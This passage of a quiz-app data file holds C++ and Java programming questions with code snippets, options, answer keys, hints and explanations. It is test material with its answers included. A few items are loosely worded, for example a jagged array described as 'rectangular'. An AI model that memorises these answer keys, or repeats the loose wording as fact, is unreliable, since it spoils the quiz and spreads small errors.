    explanation: "Line 7 calls `v.erase(it)`. Erasing from a `std::vector` invalidates `it` and all subsequent iterators. When the loop executes `++it` in line 5 on the next iteration, it increments an invalidated iterator, causing undefined behavior. The return value `it = v.erase(it)` must be used instead.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["stl", "iterators", "debugging", "invalidation"]
  },
  {
    id: "cpp-exp-014",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "modern_cpp",
    subtopic: "structured_binding",
    standardVersion: "C++17",
    prompt: "What does this C++17 structured binding snippet print?",
    code: "#include <iostream>\n#include <tuple>\n#include <string>\nint main() {\n    std::tuple<int, std::string, double> record{101, \"Alex\", 3.85};\n    auto [id, name, gpa] = record;\n    name = \"Jordan\";\n    std::cout << std::get<1>(record) << \"-\" << name;\n    return 0;\n}",
    options: ["Alex-Jordan", "Jordan-Jordan", "Alex-Alex", "Compilation error"],
    correctAnswer: "Alex-Jordan",
    acceptedAnswers: ["Alex-Jordan"],
    hint: "Structured binding with 'auto [a, b, c]' decomposes by value, creating independent copies.",
    explanation: "Because the structured binding `auto [id, name, gpa] = record;` decomposes by value (not `auto&`), `name` is an independent copy of `std::get<1>(record)`. Mutating `name = \"Jordan\"` does not mutate the tuple, outputting 'Alex-Jordan'.",
    points: 300,
    estimatedSeconds: 40,
    tags: ["cpp17", "structured-binding", "tuple"]
  },
  {
    id: "cpp-exp-015",
    language: "cpp",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "type_traits",
    subtopic: "type_decay",
    standardVersion: "C++17",
    prompt: "What transformation does `std::decay_t<T>` apply to a type?",
    code: "using RawType = std::decay_t<const int&>;",
    options: [
      "Strips top-level const/volatile qualifiers, removes references, and converts array/function types to pointers (modeling pass-by-value)",
      "Converts primitive types to equivalent standard library class wrappers",
      "Converts pointers into std::shared_ptr instances",
      "Forces a type to become an rvalue reference"
    ],
    correctAnswer: "Strips top-level const/volatile qualifiers, removes references, and converts array/function types to pointers (modeling pass-by-value)",
    acceptedAnswers: ["Strips top-level const/volatile qualifiers, removes references, and converts array/function types to pointers (modeling pass-by-value)"],
    hint: "std::decay applies the exact type transformations that occur when passing an argument by value.",
    explanation: "`std::decay<T>` models the type conversions performed when passing arguments by value to functions: lvalue-to-rvalue, array-to-pointer, and function-to-pointer conversions, stripping references and top-level `const`/`volatile` qualifiers. Thus `std::decay_t<const int&>` yields `int`.",
    points: 300,
    estimatedSeconds: 45,
    tags: ["type-traits", "templates", "decay"]
  },
  {
    id: "cpp-exp-016",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "modern_cpp",
    subtopic: "std_optional_value_or",
    standardVersion: "C++17",
    prompt: "What does this C++17 `std::optional` snippet print?",
    code: "#include <iostream>\n#include <optional>\nstd::optional<int> findValue(bool found) {\n    if (found) return 99;\n    return std::nullopt;\n}\nint main() {\n    std::cout << findValue(true).value_or(-1) << \":\" \n              << findValue(false).value_or(-1);\n    return 0;\n}",
    options: ["99:-1", "99:0", "-1:99", "-1:-1"],
    correctAnswer: "99:-1",
    acceptedAnswers: ["99:-1"],
    hint: "value_or returns the contained value if present; otherwise it returns the default fallback passed as parameter.",
    explanation: "`findValue(true)` contains `99`, so `.value_or(-1)` returns 99. `findValue(false)` returns `std::nullopt`, so `.value_or(-1)` yields -1. The output is '99:-1'.",
    points: 300,
    estimatedSeconds: 35,
    tags: ["cpp17", "optional"]
  },
  {
    id: "cpp-exp-017",
    language: "cpp",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "raii",
    subtopic: "copy_and_swap_idiom",
    standardVersion: "C++17",
    prompt: "What is the primary advantage of the 'Copy-and-Swap Idiom' when implementing the copy assignment operator?",
    code: "Widget& operator=(Widget other) {\n    swap(*this, other);\n    return *this;\n}",
    options: [
      "It achieves strong exception safety and eliminates self-assignment code duplication automatically",
      "It executes assignment operations in O(0) constant time without swapping pointers",
      "It bypasses destructor calls for superseded member objects",
      "It requires no user-defined swap or copy constructor"
    ],
    correctAnswer: "It achieves strong exception safety and eliminates self-assignment code duplication automatically",
    acceptedAnswers: ["It achieves strong exception safety and eliminates self-assignment code duplication automatically"],
    hint: "Notice Widget other is passed by value (copy constructor handles allocation before entering the function body).",
    explanation: "By taking parameter `other` by value, the copy occurs during parameter passing. If that copy throws, the target object `*this` is untouched (strong exception safety). The non-throwing `swap` then transfers resources, and `other`'s destructor cleans up the old data on return.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["raii", "copy-and-swap", "exception-safety"]
  },
  {
    id: "cpp-exp-018",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "oop",
    subtopic: "virtual_inheritance_diamond",
    standardVersion: "C++17",
    prompt: "In a diamond inheritance hierarchy, how many `Base` subobjects exist in an instance of `Bottom` when virtual inheritance is used?",
    code: "#include <iostream>\nstruct Base { int x = 10; };\nstruct Left : virtual public Base {};\nstruct Right : virtual public Base {};\nstruct Bottom : public Left, public Right {};\nint main() {\n    Bottom b;\n    b.x = 42;\n    std::cout << b.Left::x << \"-\" << b.Right::x;\n    return 0;\n}",
    options: ["42-42", "Ambiguity compiler error", "10-42", "42-10"],
    correctAnswer: "42-42",
    acceptedAnswers: ["42-42"],
    hint: "Virtual inheritance ensures that only one shared instance of Base exists in Bottom.",
    explanation: "Virtual inheritance (`virtual public Base`) ensures that the most derived class `Bottom` contains only a single shared `Base` subobject, eliminating the diamond problem ambiguity. Setting `b.x = 42` mutates that single instance, so `Left::x` and `Right::x` both refer to the exact same variable with value 42.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["oop", "virtual-inheritance", "diamond-problem"]
  },
  {
    id: "cpp-exp-019",
    language: "cpp",
    difficulty: "expert",
    type: "fill_code",
    topic: "modern_cpp",
    subtopic: "std_variant_std_visit",
    standardVersion: "C++17",
    prompt: "Fill in the standard utility function used in C++17 to apply a callable visitor to a `std::variant`.",
    code: "#include <variant>\n#include <iostream>\nint main() {\n    std::variant<int, std::string> v = 42;\n    std::_____([](const auto& val) { std::cout << val; }, v);\n    return 0;\n}",
    correctAnswer: "visit",
    acceptedAnswers: ["visit"],
    hint: "The function that executes the visitor pattern on std::variant.",
    explanation: "`std::visit` takes a callable visitor (or overloaded lambda set) and one or more `std::variant` instances, determining the active alternative at runtime and dispatching to the matching lambda overload.",
    points: 300,
    estimatedSeconds: 30,
    tags: ["cpp17", "variant", "visit"]
  },
  {
    id: "cpp-exp-020",
    language: "cpp",
    difficulty: "expert",
    type: "predict_output",
    topic: "concurrency",
    subtopic: "memory_order_relaxed_vs_cst",
    standardVersion: "C++17",
    prompt: "What is guaranteed when using `std::atomic<int>` with default `operator++()`?",
    code: "#include <iostream>\n#include <atomic>\nint main() {\n    std::atomic<int> counter{0};\n    counter++; // Default memory order\n    std::cout << counter.load();\n    return 0;\n}",
    options: [
      "It performs an atomic read-modify-write operation with sequentially consistent memory order (std::memory_order_seq_cst)",
      "It compiles into a standard non-atomic integer instruction with potential data race",
      "It requires a lock_guard mutex lock surrounding the operation",
      "It guarantees zero execution cycles on all CPUs"
    ],
    correctAnswer: "It performs an atomic read-modify-write operation with sequentially consistent memory order (std::memory_order_seq_cst)",
    acceptedAnswers: ["It performs an atomic read-modify-write operation with sequentially consistent memory order (std::memory_order_seq_cst)"],
    hint: "All default operators on std::atomic enforce sequentially consistent memory ordering.",
    explanation: "In C++, overloaded operators on `std::atomic` (such as `counter++`) default to `std::memory_order_seq_cst`, providing the strongest memory ordering guarantee: a single total global order observed by all threads without data races.",
    points: 300,
    estimatedSeconds: 50,
    tags: ["concurrency", "atomics", "memory-model"]
  }
];

/* --- End of data/cpp-questions.js --- */

/* --- Start of data/java-questions.js --- */
/**
 * SyntaxArena Question Bank — Java (Java SE 17/21 LTS) (Batch 4)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: Java SE 17 LTS / Java SE 21 LTS
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var javaQuestions = window.javaQuestions = [
  // =========================================================================
  // JAVA BEGINNER (20 QUESTIONS: java-beg-001 to java-beg-020)
  // =========================================================================
  {
    id: "java-beg-001",
    language: "java",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "data_types",
    subtopic: "primitives_vs_objects",
    standardVersion: "Java 17",
    prompt: "Which of the following is an unboxed primitive data type in Java rather than a reference type?",
    code: null,
    options: ["boolean", "Boolean", "String", "Integer"],
    correctAnswer: "boolean",
    acceptedAnswers: ["boolean"],
    hint: "Primitive types in Java are lowercase keywords that store raw values directly on the stack.",
    explanation: "Java has 8 primitive types: `byte`, `short`, `int`, `long`, `float`, `double`, `boolean`, and `char`. `Boolean`, `String`, and `Integer` are reference classes residing in `java.lang`.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["primitives", "types", "fundamentals"]
  },
  {
    id: "java-beg-002",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "string_concatenation_precedence",
    standardVersion: "Java 17",
    prompt: "What is printed by this expression evaluated from left to right with the `+` operator?",
    code: "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Result: \" + 10 + 20);\n    }\n}",
    options: ["Result: 1020", "Result: 30", "Result: 10 20", "Compilation error"],
    correctAnswer: "Result: 1020",
    acceptedAnswers: ["Result: 1020"],
    hint: "The + operator evaluates left-to-right; once a string is encountered, subsequent + operations perform string concatenation.",
    explanation: "Left-to-right evaluation starts with `\"Result: \" + 10`, producing string `\"Result: 10\"`. Then `\"Result: 10\" + 20` performs another string concatenation, resulting in `\"Result: 1020\"`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "string-concatenation"]
  },
  {
    id: "java-beg-003",
    language: "java",
    difficulty: "beginner",
    type: "find_bug",
    topic: "variables",
    subtopic: "uninitialized_local_variable",
    standardVersion: "Java 17",
    prompt: "Identify the line with the compilation error attempting to read an uninitialized local variable.",
    code: "public class Test {\n    public static void main(String[] args) {\n        int count;\n        System.out.println(count);\n    }\n}",
    correctAnswer: 4,
    targetLine: 4,
    acceptedAnswers: [4, "4", "Line 4"],
    hint: "Unlike instance fields, local variables inside methods are NOT assigned default values automatically.",
    explanation: "Line 4 attempts to read `count`. In Java, local variables do not receive default values and must be explicitly initialized before being read; otherwise a compilation error occurs.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["variables", "scope", "debugging"]
  },
  {
    id: "java-beg-004",
    language: "java",
    difficulty: "beginner",
    type: "fill_code",
    topic: "main_method",
    subtopic: "signature",
    standardVersion: "Java 17",
    prompt: "Fill in the missing keyword in the standard entry point method signature for a standalone Java application.",
    code: "public class App {\n    public ______ void main(String[] args) {\n        System.out.println(\"Running\");\n    }\n}",
    correctAnswer: "static",
    acceptedAnswers: ["static"],
    hint: "This keyword allows the JVM to invoke the entry point without first creating an instance of the class.",
    explanation: "The standard Java entry point requires `public static void main(String[] args)`. The `static` keyword allows the JVM to invoke `main` directly on the class without instantiating it.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["syntax", "main-method"]
  },
  {
    id: "java-beg-005",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "length_property",
    standardVersion: "Java 17",
    prompt: "What does this code print regarding array length?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int[] numbers = new int[4];\n        System.out.println(numbers.length + \":\" + numbers[0]);\n    }\n}",
    options: ["4:0", "4:null", "0:0", "4:garbage"],
    correctAnswer: "4:0",
    acceptedAnswers: ["4:0"],
    hint: "Primitive int array elements default to 0 upon allocation, and .length is an immutable field.",
    explanation: "Allocating `new int[4]` creates an array with 4 elements, so `numbers.length` is 4. Primitive numeric array slots are initialized to default value 0. The output is '4:0'.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["arrays", "default-values"]
  },
  {
    id: "java-beg-006",
    language: "java",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "control_flow",
    subtopic: "while_vs_do_while",
    standardVersion: "Java 17",
    prompt: "What distinguishes a `do-while` loop from a standard `while` loop in Java?",
    code: "do {\n    action();\n} while (condition);",
    options: [
      "The body of a do-while loop is guaranteed to execute at least once before testing condition",
      "do-while loops run in a separate background thread",
      "do-while loops do not permit break statements",
      "do-while loops can only iterate over integer collections"
    ],
    correctAnswer: "The body of a do-while loop is guaranteed to execute at least once before testing condition",
    acceptedAnswers: ["The body of a do-while loop is guaranteed to execute at least once before testing condition"],
    hint: "Notice the condition check occurs at the bottom of the loop body.",
    explanation: "In a `do-while` loop, condition evaluation occurs post-iteration (at the bottom), guaranteeing that the loop statements execute at least once even if the condition is initially false.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["control-flow", "loops"]
  },
  {
    id: "java-beg-007",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "loops",
    subtopic: "enhanced_for_loop",
    standardVersion: "Java 17",
    prompt: "What is printed by this enhanced for-each loop?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int[] values = {3, 6, 9};\n        int total = 0;\n        for (int v : values) {\n            total += v;\n        }\n        System.out.println(total);\n    }\n}",
    options: ["18", "9", "3", "0"],
    correctAnswer: "18",
    acceptedAnswers: ["18", 18],
    hint: "Sum all elements: 3 + 6 + 9.",
    explanation: "The enhanced for loop iterates over each element in `values`. Total is computed as 0 + 3 + 6 + 9 = 18.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["loops", "for-each"]
  },
  {
    id: "java-beg-008",
    language: "java",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "constructor_basics",
    standardVersion: "Java 17",
    prompt: "When does the Java compiler automatically generate a default no-argument constructor for a class?",
    code: "public class Person {\n    String name;\n}",
    options: [
      "Only when the developer defines no other constructors in the class",
      "Always, regardless of other user-defined constructors",
      "Only when the class is marked abstract",
      "Never; constructors must always be written manually"
    ],
    correctAnswer: "Only when the developer defines no other constructors in the class",
    acceptedAnswers: ["Only when the developer defines no other constructors in the class"],
    hint: "If you add a parameterized constructor, the default no-arg constructor disappears unless explicitly provided.",
    explanation: "The Java compiler generates an implicit default no-argument constructor if and only if no other constructors are explicitly declared in the class definition. Adding any constructor suppresses the automatic default constructor.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["oop", "constructors"]
  },
  {
    id: "java-beg-009",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "string_length_substring",
    standardVersion: "Java 17",
    prompt: "What is printed by this `substring` operation in Java?",
    code: "public class Main {\n    public static void main(String[] args) {\n        String s = \"SyntaxArena\";\n        System.out.println(s.substring(0, 6));\n    }\n}",
    options: ["Syntax", "SyntaxA", "yntaxe", "Arena"],
    correctAnswer: "Syntax",
    acceptedAnswers: ["Syntax"],
    hint: "In Java, substring(beginIndex, endIndex) is inclusive of beginIndex and exclusive of endIndex.",
    explanation: "In Java, `substring(beginIndex, endIndex)` includes indices from `beginIndex` up to `endIndex - 1`. Indices 0 through 5 correspond to characters 'S', 'y', 'n', 't', 'a', 'x', returning \"Syntax\".",
    points: 100,
    estimatedSeconds: 25,
    tags: ["strings", "substring"]
  },
  {
    id: "java-beg-010",
    language: "java",
    difficulty: "beginner",
    type: "fill_code",
    topic: "oop",
    subtopic: "inheritance_keyword",
    standardVersion: "Java 17",
    prompt: "Fill in the Java keyword used by a class to inherit from a superclass.",
    code: "public class Warrior _______ Character {\n    int stamina;\n}",
    correctAnswer: "extends",
    acceptedAnswers: ["extends"],
    hint: "A class extends another class, while it implements an interface.",
    explanation: "In Java, the `extends` keyword establishes an inheritance relationship where a subclass inherits fields and non-private methods from a superclass.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["oop", "inheritance", "keywords"]
  },
  {
    id: "java-beg-011",
    language: "java",
    difficulty: "beginner",
    type: "find_bug",
    topic: "strings",
    subtopic: "string_immutability",
    standardVersion: "Java 17",
    prompt: "Identify the line with the logical defect where the return value of an immutable `String` method is ignored.",
    code: "public class Main {\n    public static void main(String[] args) {\n        String msg = \"hello\";\n        msg.toUpperCase();\n        System.out.println(msg);\n    }\n}",
    correctAnswer: 4,
    targetLine: 4,
    acceptedAnswers: [4, "4", "Line 4"],
    hint: "Strings in Java are immutable; methods like toUpperCase() return a new string rather than modifying the original in place.",
    explanation: "Line 4 invokes `msg.toUpperCase()`, but discards the returned transformed string. Because `java.lang.String` is immutable, `msg` remains \"hello\". Line 4 should reassign: `msg = msg.toUpperCase();`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "immutability", "debugging"]
  },
  {
    id: "java-beg-012",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arithmetic",
    subtopic: "integer_division",
    standardVersion: "Java 17",
    prompt: "What is printed by this integer division in Java?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int a = 7;\n        int b = 2;\n        System.out.println(a / b);\n    }\n}",
    options: ["3", "3.5", "4", "3.0"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "Dividing two integers in Java performs truncating integer division toward zero.",
    explanation: "When both operands of `/` are integers, Java performs integer division, discarding the fractional remainder. 7 / 2 evaluates to 3.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["arithmetic", "division", "primitives"]
  },
  {
    id: "java-beg-013",
    language: "java",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "constants",
    subtopic: "final_keyword",
    standardVersion: "Java 17",
    prompt: "What effect does the `final` modifier have when applied to a variable?",
    code: "final double PI = 3.14159;",
    options: [
      "The variable can be assigned only once and cannot be reassigned thereafter",
      "The variable is stored exclusively in CPU cache memory",
      "The variable becomes accessible to all packages without public access",
      "The variable cannot be accessed from within a loop"
    ],
    correctAnswer: "The variable can be assigned only once and cannot be reassigned thereafter",
    acceptedAnswers: ["The variable can be assigned only once and cannot be reassigned thereafter"],
    hint: "final variables are constants whose references or primitive values cannot be mutated.",
    explanation: "In Java, marking a variable `final` creates a constant that can be assigned exactly once. Any subsequent attempt to reassign to a `final` variable produces a compilation error.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["final", "constants"]
  },
  {
    id: "java-beg-014",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "ternary_operator",
    standardVersion: "Java 17",
    prompt: "What is printed by this conditional ternary expression?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int score = 85;\n        String tier = score >= 90 ? \"Gold\" : (score >= 80 ? \"Silver\" : \"Bronze\");\n        System.out.println(tier);\n    }\n}",
    options: ["Silver", "Gold", "Bronze", "Compilation error"],
    correctAnswer: "Silver",
    acceptedAnswers: ["Silver"],
    hint: "85 is not >= 90, but 85 is >= 80.",
    explanation: "`score >= 90` is false (85 < 90). The else branch evaluates `(score >= 80 ? \"Silver\" : \"Bronze\")`. Because 85 >= 80 is true, it yields \"Silver\".",
    points: 100,
    estimatedSeconds: 25,
    tags: ["control-flow", "ternary"]
  },
  {
    id: "java-beg-015",
    language: "java",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "packages",
    subtopic: "default_import",
    standardVersion: "Java 17",
    prompt: "Which package is automatically imported by default into every Java source file?",
    code: null,
    options: ["java.lang", "java.util", "java.io", "java.base"],
    correctAnswer: "java.lang",
    acceptedAnswers: ["java.lang"],
    hint: "It contains fundamental classes like String, System, Math, and Object.",
    explanation: "Under the Java Language Specification, every compilation unit automatically imports all public types from package `java.lang`, which is why classes like `String`, `System`, and `Math` can be used without an explicit import.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["packages", "java.lang"]
  },
  {
    id: "java-beg-016",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "oop",
    subtopic: "this_keyword",
    standardVersion: "Java 17",
    prompt: "What does this code print using the `this` reference to disambiguate parameters?",
    code: "public class Box {\n    int length;\n    Box(int length) {\n        this.length = length * 2;\n    }\n    public static void main(String[] args) {\n        Box b = new Box(5);\n        System.out.println(b.length);\n    }\n}",
    options: ["10", "5", "0", "NullPointerException"],
    correctAnswer: "10",
    acceptedAnswers: ["10", 10],
    hint: "this.length assigns to the instance field, while length is the constructor parameter (5).",
    explanation: "`this.length = length * 2` assigns 5 * 2 = 10 to the instance field `length` of the newly created `Box` object. Printing `b.length` yields 10.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["oop", "this"]
  },
  {
    id: "java-beg-017",
    language: "java",
    difficulty: "beginner",
    type: "fill_code",
    topic: "oop",
    subtopic: "interface_implementation",
    standardVersion: "Java 17",
    prompt: "Fill in the Java keyword used when a class realizes the contract defined by an interface.",
    code: "public class Task _________ Runnable {\n    public void run() {}\n}",
    correctAnswer: "implements",
    acceptedAnswers: ["implements"],
    hint: "A class extends another class, but implements an interface.",
    explanation: "In Java, a class uses the `implements` keyword to declare that it fulfills one or more interfaces, providing concrete implementations for their abstract methods.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["oop", "interfaces", "keywords"]
  },
  {
    id: "java-beg-018",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "short_circuit_and",
    standardVersion: "Java 17",
    prompt: "What is printed by this demonstration of the short-circuit `&&` operator?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int x = 5;\n        if (x < 3 && ++x > 5) {\n            // not entered\n        }\n        System.out.println(x);\n    }\n}",
    options: ["5", "6", "4", "Compilation error"],
    correctAnswer: "5",
    acceptedAnswers: ["5", 5],
    hint: "With logical AND (&&), if the left condition is false, the right condition is never evaluated.",
    explanation: "Because `x < 3` evaluates to `false`, the conditional expression short-circuits. The right operand `++x > 5` is never evaluated, leaving `x` unmodified at 5.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "short-circuit"]
  },
  {
    id: "java-beg-019",
    language: "java",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "object_root_hierarchy",
    standardVersion: "Java 17",
    prompt: "What is the ultimate root superclass of all classes in the Java class hierarchy?",
    code: null,
    options: ["java.lang.Object", "java.lang.Class", "java.lang.Base", "java.lang.Root"],
    correctAnswer: "java.lang.Object",
    acceptedAnswers: ["java.lang.Object"],
    hint: "Every class in Java directly or indirectly inherits from this class.",
    explanation: "In Java, `java.lang.Object` sits at the top of the class hierarchy tree. Every class, including arrays and user-defined classes without an explicit `extends` clause, inherits directly or indirectly from `Object`.",
    points: 100,
    estimatedSeconds: 20,
    tags: ["oop", "object-class"]
  },
  {
    id: "java-beg-020",
    language: "java",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "multidimensional_array",
    standardVersion: "Java 17",
    prompt: "What is printed by accessing this 2D rectangular array?",
    code: "public class Main {\n    public static void main(String[] args) {\n        int[][] matrix = {\n            {1, 2},\n            {3, 4, 5}\n        };\n        System.out.println(matrix.length + \":\" + matrix[1].length);\n    }\n}",
    options: ["2:3", "2:2", "3:3", "5:2"],
    correctAnswer: "2:3",
    acceptedAnswers: ["2:3"],
    hint: "matrix has 2 rows (sub-arrays); row 1 ({3, 4, 5}) contains 3 elements.",
    explanation: "In Java, multi-dimensional arrays are arrays of arrays. `matrix.length` is 2 (two row arrays). `matrix[1]` refers to the second row `{3, 4, 5}`, which has length 3. The output is '2:3'.",
    points: 100,
    estimatedSeconds: 25,
    tags: ["arrays", "multidimensional"]
  },

  // =========================================================================
  // JAVA INTERMEDIATE (20 QUESTIONS: java-int-001 to java-int-020)
  // =========================================================================
  {
    id: "java-int-001",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "strings",
    subtopic: "equals_vs_reference_equality",
    standardVersion: "Java 17",
    prompt: "What does this code print comparing string reference identity (`==`) versus value equality (`.equals()`)?",
    code: "public class Main {\n    public static void main(String[] args) {\n        String s1 = new String(\"Arena\");\n        String s2 = new String(\"Arena\");\n        System.out.println((s1 == s2) + \" \" + s1.equals(s2));\n    }\n}",
    options: ["false true", "true true", "false false", "true false"],
    correctAnswer: "false true",
    acceptedAnswers: ["false true"],
    hint: "new String() forces allocation of distinct objects on the heap with different memory addresses.",
    explanation: "`s1 == s2` compares object memory references; since both were created with `new String()`, they refer to two distinct heap instances, evaluating to `false`. `s1.equals(s2)` compares character content, evaluating to `true`. Output is 'false true'.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["strings", "equals", "reference-equality"]
  },
  {
    id: "java-int-002",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "strings",
    subtopic: "string_pool_intern",
    standardVersion: "Java 17",
    prompt: "What is printed when testing reference equality with the JVM String Constant Pool?",
    code: "public class Main {\n    public static void main(String[] args) {\n        String a = \"Java\";\n        String b = \"Java\";\n        String c = new String(\"Java\").intern();\n        System.out.println((a == b) + \" \" + (a == c));\n    }\n}",
    options: ["true true", "true false", "false false", "false true"],
    correctAnswer: "true true",
    acceptedAnswers: ["true true"],
    hint: "String literals are automatically interned into the string pool; .intern() returns the canonical pool reference.",
    explanation: "String literals `\"Java\"` are interned at class load time, so `a` and `b` share the identical reference in the String Constant Pool (`a == b` is true). Calling `.intern()` on `new String(\"Java\")` returns the pooled reference `a`, so `a == c` is also true. Output is 'true true'.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["strings", "string-pool", "intern"]
  },
  {
    id: "java-int-003",
    language: "java",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "functions",
    subtopic: "pass_by_value_references",
    standardVersion: "Java 17",
    prompt: "How does Java handle parameter passing when an object reference is passed to a method?",
    code: "void modify(StringBuilder sb) {\n    sb.append(\"!\");\n    sb = new StringBuilder(\"reset\");\n}",
    options: [
      "Strictly pass-by-value: a copy of the reference address is passed, so object mutations persist but reassigning the parameter variable has no effect outside",
      "Strictly pass-by-reference: reassigning sb alters the caller's reference variable directly",
      "Primitives are pass-by-value, but all objects are pass-by-reference",
      "Method parameters are passed via thread-shared global registers"
    ],
    correctAnswer: "Strictly pass-by-value: a copy of the reference address is passed, so object mutations persist but reassigning the parameter variable has no effect outside",
    acceptedAnswers: ["Strictly pass-by-value: a copy of the reference address is passed, so object mutations persist but reassigning the parameter variable has no effect outside"],
    hint: "Java is strictly 100% pass-by-value for all arguments, including references.",
    explanation: "Java is strictly pass-by-value. When an object is passed, the value of the reference (pointer address) is copied. Calling methods on the object alters the shared heap instance, but reassigning `sb = new ...` modifies only the local copy of the reference, not the caller's variable.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["methods", "pass-by-value", "references"]
  },
  {
    id: "java-int-004",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "exceptions",
    subtopic: "finally_block_execution",
    standardVersion: "Java 17",
    prompt: "What is returned and printed by this method containing try, catch, and finally blocks?",
    code: "public class Main {\n    static int test() {\n        try {\n            return 10;\n        } finally {\n            return 20;\n        }\n    }\n    public static void main(String[] args) {\n        System.out.println(test());\n    }\n}",
    options: ["20", "10", "30", "Compilation error"],
    correctAnswer: "20",
    acceptedAnswers: ["20", 20],
    hint: "A return statement in a finally block overrides any previous return statement or unhandled exception in the try block.",
    explanation: "Under the Java Language Specification (§14.20.2), the `finally` block is executed immediately before `try` control completes. A `return` inside `finally` abruptly overrides the pending return of 10, returning 20.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["exceptions", "finally", "control-flow"]
  },
  {
    id: "java-int-005",
    language: "java",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "autoboxing",
    subtopic: "null_unboxing_npe",
    standardVersion: "Java 17",
    prompt: "Identify the line that throws a `NullPointerException` due to automatic unboxing of a `null` wrapper object.",
    code: "public class Main {\n    public static void main(String[] args) {\n        Integer val = null;\n        int result = val + 5;\n        System.out.println(result);\n    }\n}",
    correctAnswer: 4,
    targetLine: 4,
    acceptedAnswers: [4, "4", "Line 4"],
    hint: "The + operator requires a primitive; Java attempts to invoke val.intValue() automatically.",
    explanation: "Line 4 evaluates `val + 5`. To add primitive 5, Java attempts to unbox `val` by calling `val.intValue()`. Because `val` is `null`, invoking `intValue()` on it throws a runtime `NullPointerException`.",
    points: 200,
    estimatedSeconds: 35,
    tags: ["autoboxing", "npe", "debugging"]
  },
  {
    id: "java-int-006",
    language: "java",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "io",
    subtopic: "try_with_resources",
    standardVersion: "Java 17",
    prompt: "Fill in the interface that a custom resource class must implement to be automatically closed in a try-with-resources statement.",
    code: "public class Resource implements _____________ {\n    @Override\n    public void close() throws Exception {}\n}",
    correctAnswer: "AutoCloseable",
    acceptedAnswers: ["AutoCloseable"],
    hint: "The base interface in java.lang introduced in Java 7 for automated cleanup.",
    explanation: "Java try-with-resources requires that any managed resource implement `java.lang.AutoCloseable` (or its subinterface `java.io.Closeable`). The runtime invokes `.close()` automatically upon exiting the try block.",
    points: 200,
    estimatedSeconds: 25,
    tags: ["io", "autocloseable", "try-with-resources"]
  },
  {
    id: "java-int-007",
    language: "java",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "collections",
    subtopic: "arraylist_remove_index_vs_object",
    standardVersion: "Java 17",
    prompt: "What does this code print when removing an integer element from an `ArrayList<Integer>`?",
    code: "import java.util.ArrayList;\npublic class Main {\n    public static void main(String[] args) {\n        ArrayList<Integer> list = new ArrayList<>();\n        list.add(10);\n        list.add(20);\n        list.add(30);\n        list.remove(1);\n        System.out.println(list);\n    }\n}",
    options: ["[10, 30]", "[20, 30]", "[10, 20]", "[30]"],
    correctAnswer: "[10, 30]",
    acceptedAnswers: ["[10, 30]"],
    hint: "list.remove(int index) removes by zero-based index, while list.remove(Object o) removes by value.",
    explanation: "Because the argument literal `1` is an `int`, the method overload `remove(int index)` is selected rather than `remove(Object o)`. Index 1 contains value 20, which is removed, leaving `[10, 30]`.",
    points: 200,
    estimatedSeconds: 40,
    tags: ["collections", "arraylist", "overloading"]
  },
  {
    id: "java-int-008",
    language: "java",
    difficulty: "intermediate",
